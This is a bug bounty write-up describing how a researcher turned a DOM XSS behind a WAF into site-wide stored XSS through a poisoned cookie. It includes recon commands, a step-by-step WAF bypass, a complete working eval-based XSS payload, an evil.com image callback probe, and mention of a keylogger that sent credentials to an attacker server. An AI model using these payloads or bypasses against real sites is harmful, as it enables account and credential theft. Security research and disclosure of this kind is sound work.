---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-16_500-bounty-by-escalating-dom-xss-to-stored-xss.md
original_filename: 2023-12-16_500-bounty-by-escalating-dom-xss-to-stored-xss.md
title: $500 Bounty by Escalating DOM XSS to Stored XSS
category: documents
detected_topics:
- xss
- sso
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- xss
- sso
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: d4991c5f27fe086df76f4750bdeef1475cf851fd0ba82dec03f5a4f14bacde06
text_sha256: 6565f88996272e0465b07c3bcc587a04347dca5ed79aafd69bc59aa13f404dec
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: false
---

# $500 Bounty by Escalating DOM XSS to Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-16_500-bounty-by-escalating-dom-xss-to-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: False
- Raw SHA256: `d4991c5f27fe086df76f4750bdeef1475cf851fd0ba82dec03f5a4f14bacde06`
- Text SHA256: `6565f88996272e0465b07c3bcc587a04347dca5ed79aafd69bc59aa13f404dec`


## Content

---
title: "$500 Bounty by Escalating DOM XSS to Stored XSS"
url: "https://medium.com/@rodriguezjorgex/escalating-dom-xss-to-stored-xss-eb6f3a669af3"
authors: ["Rodriguezjorgex"]
bugs: ["DOM XSS", "Stored XSS", "Self-XSS"]
bounty: "500"
publication_date: "2023-12-16"
added_date: "2024-01-03"
source: "pentester.land/writeups.json"
original_index: 618
scraped_via: "browseros"
---

# $500 Bounty by Escalating DOM XSS to Stored XSS

Top highlight

$500 Bounty by Escalating DOM XSS to Stored XSS
Rodriguezjorgex
Follow
8 min read
·
Dec 16, 2023

670

5

TLDR

In this article, I detail how I used DOM XSS to assign a cookie that created a persistent XSS across the entire domain.

Initial setup

I always start my hunting by opening Burp Suite Pro and running the Burp Browser, which is a modified Chrome browser. I’ve also done some recon ahead of time (weeks ago) for all the programs on H1, BugCrowd, and Intigriti. This data is saved on a CouchDB using the BBRF Server.

Recon

For recon I like to keep it simple. Just running subfinder and the chaos tool on the target domain. Once I had a list of subdomains, I like running httpx with the following flags: -sc -td -cl

#domains.txt has the target domain
cat domains.txt | subfinder | bbrf domain add - -s subfinder
chaos -d targetdomain.tld | bbrf domain add - -s chaos
#The bbrf command adds the data to my bbrf server.
Manual Hunting
Getting my bearings

Once recon is done, I like to do manual hunting of the target. My methodology for manual hunting is just visiting the web application and clicking around to get an understanding of the web application.

Start simple and increase complexity

When hunting for vulnerabilities, I always like to start simple. I notice a lot of bug hunters on X or Reddit, they like to ask other hunters what payload they used, or they like to fuzz a bunch of payloads they see on PayloadAllTheThings. I don’t like this approach. Every web application is different and I believe they require individual testing to get XSS. Especially hardened targets like Bug Bounty targets.

Looking for low hanging fruit

While clicking around and checking out search fields, I like to use the DOM Invader string. This allows me to test for DOM XSS and RXSS while also getting to know the web application.

Press enter or click to view image in full size
DOM Invader canary that I use in search fields and url bar to search for DOM XSS

DOM Invader canary that I use in search fields and url bar to search for DOM XSS

Turning Red

After putting the DOM Invader canary into the web applications main search field (on the main page), I get DOM Invader turning red. Anytime it turns red, I always investigate.

Press enter or click to view image in full size
DOM Invader finding an innerHTML sink

This application was running an Akamai WAF, so clicking on the exploit button would be useless as I would get blocked by the WAF and possibly get my IP blocked.

Increasing complexity

Once I identified the sink, I tried simple payloads to see which characters were getting encoded. I started with a simple “>

Press enter or click to view image in full size
Adding “> in the URL bar

I checked DOM Invader again and noticed the “> were being url decoded

Press enter or click to view image in full size

“> being passed to InnerHTML. XSS possible

I identified that XSS is possible, however when looking for the location where the HTML is being displayed in the web page, the only locations I saw had the payload being encoded

Press enter or click to view image in full size
Results encoded

Inserting HTML

Since the innerHTML was not being reflected in the web application, I could not use a simple <h1>test to see if HTML is being rendered. So in this instance, I used a simple <img/src=//evil.com> and checked the Burp Proxy history for a callback to evil.com

Press enter or click to view image in full size
Image tag loading evil.com

Payload Creation

Limitations

Having inserted HTML, I knew XSS was possible. However, there were some limitations that proved difficult and made bypassing the Akamai WAF impossible.

The innerHTML was being overwritten almost immediately. So the payload only lived for about half a second. This put <div> onmouseover or onfocus payloads out of the question as the innerHTML would get overwritten and the div would not focus.
I could only use the <img onerror> payload as image loading proved successful earlier.

Given these limitations, it was hard to craft a payload that could bypass Akamai.

Time to give up?
Not giving
Back to recon

It’s time to go back to recon. This web application had multiple subdomains for the different world regions. For example: https://us.vulnerableapplication.tld would take you to the US version of the website. The same codebase could be found in that subdomain.

Using the recon data I obtained earlier, I looked for a subdomain that wasn’t protected by Akamai.

Press enter or click to view image in full size
httpx results with -td flag
Internal WAF Bypass

After trying out the subdomain, it seemed that it also had a WAF, however this WAF wasn’t Akamai, and it was much easier to bypass.

For bypassing WAFs, I like to figure out the exact point where the WAF triggers, and use that point to figure out different characters that will bypass the trigger.

Get Rodriguezjorgex’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Starting off, I know I need the onerror event, so I start with a simple payload:

<img/src/onerror>

This payload did not get blocked.

I then tried adding an equal sign

<img/src/onerror=>

This payload got blocked! This means that I need to figure out a way to fool the WAF in between the r and the = sign. There are a few characters we can try. First, I put a space in between

<img/src/onerror =>

This was blocked as well. Now I can continue adding other characters like %00. However I had tried that character previously and the WAF blocks it all the time. So Instead, I used %09 (\t)

<img/src/onerror %09=>

And that worked! Once we get to the right side of the onerror, the rest of the bypass becomes much easier, because we have a lot more techniques we can play with.

Right side bypass

I used the same techniques to bypass the left side for the right side. First, I typed alert

<img src onerror %09=alert>

This was blocked. So just having the word alert blocks me. However, alert is a function on the window and top objects in JavaScript. So, I can try using those gadgets to get to alert.

<img src onerror %09=window>

Blocked!

<img src onerror %09=top>

It works! Since we know the word alert gets blocked, we need to split it up. We can do this by using the square brackets and putting alert as a string, and splitting up the string.

<img src onerror %09=top['ale'%2b'rt']()>

And it works! Time to report it!

This seemed a little too easy though, as the DOM XSS was in a highly visible location. I’m sure most bug hunters would have found it by now. So I checked the out of scope vulnerabilities.

RXSS
DOM XSS
Finding Stored XSS

Not to be deterred by an OOS vulnerability, I decided to go for a way to escalate DOM XSS to stored XSS. There were many input points to test, but I first decided to check for Cookie Based Stored XSS.

I decided to use the same method for finding DOM XSS using Burp’s DOM Invader and pasted the DOM Invader canary into all the cookies in the browser. Once I reloaded the page, I noticed DOM Invader again turned red.

image tag injectable

One cookie was indeed getting reflected in the DOM! This means I can turn the DOM XSS into a Stored Cookie XSS. All I needed to do was use the DOM XSS to inject XSS into the cookie and have it get reflected each time the user navigates anywhere the sink was taking place.

After checking the source code, this sink was happening on every page of the website. So the stored XSS affected the user’s every move on the web application.

Final Payload

In order to have an easier way of modifying my payload, I utilized the location.hash value. This allowed me to have the code stay client side and bypassed the WAF. Here is the full payload:

DOM XSS Payload:

<img/src/onerror %09=testing%3dtop['ev'+'al'];foundit=top['loca'+'tion']['hash']><img/src/onerror
 =testing(decodeURI(foundit.substr(1)))>

After the # in the url:

document.cookie='vulnerablecookie=\'><img/src/onerror %09=newpal%3dtop[\'ev\' \'al\'];newpal(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>;expires=Sun, 10 Dec 2024 08:48:11 GMT;path=/;domain=.vulnerabledomain.tld'

Delivering this payload to a victim, they would get a document.cookie alert popup every time they visited any page on the web application.

Checking Payload Against Known Payloads

Searching Github, I have yet to see the payload I crafted in all the list of payloads. Thus, a Bug Hunter that ran a fuzzing tool for all the payloads on Github would not have found the XSS. Only by manually crafting a payload and figuring out the WAF was I able to come up with a payload that exploited the vulnerability. This is the importance of manual hunting and manual payload crafting.

Increasing Impact

Since the XSS happened site-wide, I decided to generate a key logger proof of concept. I hosted a server and used a simple JavaScript key logger on Github. I showed increase impact by showing the username and password being logged in the key logger and getting sent to the attacker controlled server.

However this was a waste of time as the person that triaged the Bug still marked it as a 4.7 medium rating. I was able to argue that it merited a higher score, and it was increased to a 6.1. Not enough to get a higher bounty.

Bounty and Lessons Learned

For the effort I got a $500 bounty. My first bounty on the platform that I was hunting on. This taught me a lesson on vulnerabilities that are out of scope, and how to leverage them to get in-scope bounties.

I’m sure other hunters had found the DOM XSS vulnerability, but due to it being out of scope, the hunters would stop there and not go further. But by going further and chaining two out of scope vulnerabilities (DOM XSS and Self-XSS), I was able to increase the impact and get the bounty.

Further Findings

I continued hunting to leverage the DOM XSS into stored XSS, and found another vector using the username field. It turned out that the username field on every page of a logged in user was also vulnerable to the same XSS as the Cookie. Same innerHTML style of code being used.

I was able to generate a CSRF Token and send a post request that would set the users username to an XSS and turned Self-XSS into Stored XSS. But this is for a future post if people find this interesting.
